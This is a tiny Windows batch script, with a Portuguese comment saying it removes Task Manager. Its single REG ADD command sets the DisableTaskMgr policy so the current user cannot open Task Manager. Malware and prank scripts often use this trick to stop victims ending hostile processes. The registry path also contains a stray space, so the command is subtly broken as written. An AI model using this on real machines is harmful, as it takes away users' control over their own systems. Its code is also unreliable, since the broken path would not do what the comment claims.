REM Remover Gerenciador de tarefas
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Po licies\System" /v DisableTaskMgr /t REG_DWORD /d 0x00000001 /f
exit